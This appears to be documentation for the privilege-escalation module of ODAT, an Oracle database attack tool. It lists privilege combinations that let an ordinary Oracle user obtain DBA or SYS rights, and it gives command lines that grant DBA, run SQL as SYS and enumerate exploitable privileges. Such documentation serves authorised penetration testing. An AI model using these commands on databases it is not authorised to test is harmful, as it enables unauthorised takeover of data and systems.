# Become DBA with system privileges

This module allows you to gain privileged access (e.g. DBA) using [**system privileges**](https://docs.oracle.com/cd/E21901_01/timesten.1122/e21642/privileges.htm#TTSQL339) given to Oracle user used to launch this module. It can be used to get all system privileges given to the current Oracle user also.

With these following combinations of system privileges, the Oracle user can become DBA:
 * __CREATE PROCEDURE__ and EXECUTE ANY PROCEDURE : **SYS's privileges**
 * __CREATE ANY TRIGER__ (and CREATE PROCEDURE) : **SYS's privileges**
 * __ANALYZE ANY__ (and CREATE PROCEDURE) : **SYS's privileges**
 * __CREATE ANY INDEX__ (and CREATE PROCEDURE) : **SYS's privileges**
 * __CREATE ANY PROCEDURE__ only: it is possible to alter all Oracle users' passwords (e.g. SYS's password) using APEX_040200's privileges. The database needs to be restarted :-(

* With this *privesc* module, you can give the DBA role to Oracle user used in this module (e.g. *$USER*). Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --dba-with-create-any-trigger
```

* Also, it is possible to execute SQL requests as SYS manually. Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --exec-with-execute-any-procedure 'GRANT dba TO $USER'
```

* You can revoke the DBA role using the following command:
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --revoke-dba-role
```

* As a reminder, you can use the following command to see commands of this module:
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h
```

* The command *--get-detailed-privs* can be used to get system privileges and roles granted to Oracle user used to run this module. Also, it gets system privileges and roles given to roles granted to Oracle user.
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-detailed-privs
```

* To see privileges and roles given to the current Oracle user only, the command *--get-privs* must be used:
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-privs
```

* Notice these 2 previous commands underlines system privileges that can be exploited by this module to gain privileged access.